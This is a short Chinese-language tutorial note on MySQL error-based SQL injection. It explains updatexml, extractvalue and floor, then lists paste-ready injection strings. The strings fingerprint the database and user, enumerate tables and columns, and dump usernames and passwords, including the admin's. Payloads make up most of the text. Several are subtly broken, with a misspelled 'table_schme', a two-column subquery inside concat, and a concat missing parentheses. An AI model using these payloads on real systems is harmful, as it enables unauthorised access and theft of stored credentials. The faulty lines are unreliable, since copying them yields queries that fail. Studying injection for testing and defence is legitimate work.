##### 几个报错注入常用的Mysql函数

1. updatexml(xml_doc, xpath_str, new_value)

   a. xml_doc: string格式，xml文档对象

   b. xxpath_str: path格式字符串
   c. new_value: 替换查询找到的，符合条件的数据

   d. 函数作用: 更改文档中符合条件节点的值

2. extractvalue(str_doc, xpath_str)

   a. str_doc: xml文档对象字符串

   b. xpath_str: xpath格式字符串

   c. 函数作用: 返回匹配路径的值

3. floor(number)

   a. number: 整型数据

   b. 函数作用: 返回小于或等于数字的最大数值



##### 基于回显报错Mysql注入

一般包括如下几个步骤

1. 探测数据库

   ```bash
   xxx' and updatexml(1, concat(0x7e, (select @@version)), 1) --+
   ```

2. 探测数据库当前用户

   ```bash
   xxx' and updatexml(1, concat(0x7e, (select user())), 1) --+
   ```

3. 爆表

   ```bash
   xxx' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database())), 0x7e)
   
   xxx' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0, 1)), 0x7e)
   ```

4. 爆字段

   ```bash
   xxx' and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schme=database() limit 0, 1)), 0x7e)
   ```

5. 爆内容

   ```bash
   xxx' and updatexml(1, concat(0x7e, (select password, name from users limit 0,1)), 0) --+
   ```

   

##### insert注入报错和update注入报错delete注入报错

```bash
xxx' or updatexml(1, concat(0x7e, database()), 0) or '
```



##### floor函数报错注入

```bash
xxx' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

xxx' and (select 2 from (select count(*),concat(select password from users where username='admin' limit 0, 1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
```



##### 小总结

使用updatexml和extractvalue这两个函数进行报错注入的方式是差不多的，floor函数的使用需要结合count运行和group by语句的参与

---

that's all



